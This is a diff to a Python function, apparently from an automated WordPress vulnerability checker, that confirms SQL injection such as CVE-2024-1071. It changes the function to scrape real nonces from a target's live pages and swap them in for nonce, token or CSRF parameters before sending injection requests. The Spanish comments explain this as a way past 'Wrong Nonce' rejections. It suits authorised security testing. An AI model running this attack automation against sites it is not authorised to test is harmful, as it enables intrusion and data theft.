@@ -1893,12 +1893,23 @@ def verify_wordpress_sqli(
             endpoint = boot.shortcode_page_path
             res.evidence["endpoint_shortcode_page"] = endpoint
 
+        m = (http_method or "GET").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
+
         # si el endpoint trae placeholders sin resolver (p.ej. llego tal cual de un PoC publico
-        # con 'nonce={nonce}&directory_id={dir_id}'), raspa valores REALES de una pagina viva
-        # antes de atacar -- confirmado en vivo, CVE-2024-1071: sin esto se manda el string
-        # literal '{nonce}' y el servidor rechaza SIEMPRE con 'Wrong Nonce', un bloqueo de
-        # infraestructura que no dice nada sobre si la inyeccion SQL real existe.
-        if re.search(r"\{\w+\}", endpoint or ""):
+        # con 'nonce={nonce}&directory_id={dir_id}'), O alguno de los parametros declarados es un
+        # nonce/token/csrf (el LLM/el PoC publico NUNCA puede saber un nonce de WordPress real --
+        # se genera por sesion/accion -- cualquier valor que traigan es como mucho una adivinanza,
+        # tipicamente "1" o un placeholder literal), rasca valores REALES de una pagina viva ANTES
+        # de construir el ataque -- confirmado en vivo, CVE-2024-1071: sin esto el servidor
+        # rechaza SIEMPRE con 'Wrong Nonce', un bloqueo de infraestructura que no dice nada sobre
+        # si la inyeccion SQL real existe. Funciona igual venga el nonce como placeholder en la
+        # URL o como parametro suelto -- ambas formas se han visto en vivo contra el MISMO CVE,
+        # extraidas por el LLM de maneras distintas del mismo PoC publico.
+        nonce_like_keys = [k for k in base_params
+                          if any(h in k.lower() for h in ("nonce", "token", "csrf", "security"))
+                          and k != sqli_param]
+        if re.search(r"\{\w+\}", endpoint or "") or nonce_like_keys:
             html_sources = []
             for probe_path in ("/", boot.shortcode_page_path or ""):
                 if not probe_path:
@@ -1915,9 +1926,18 @@ def verify_wordpress_sqli(
                 res.evidence["placeholders_resueltos"] = resolved
             endpoint = new_endpoint
             res.evidence["endpoint_tras_resolver_placeholders"] = endpoint
+            if nonce_like_keys:
+                nonces = _scrape_nonce_candidates("\n".join(html_sources))
+                if nonces:
+                    resolved_params = {}
+                    for k in nonce_like_keys:
+                        base_params[k] = nonces[0]
+                        resolved_params[k] = nonces[0]
+                    step(f"parametro(s) {list(resolved_params)} parecen nonce/token -- "
+                         f"sustituidos por un valor REAL raspado de una pagina viva del sitio "
+                         f"(el que trajo el PoC/LLM es, como mucho, una adivinanza)")
+                    res.evidence["parametros_resueltos_con_valor_real"] = resolved_params
 
-        m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
         orig_value = str(base_params.get(sqli_param) or "1")
 
         def send(val):
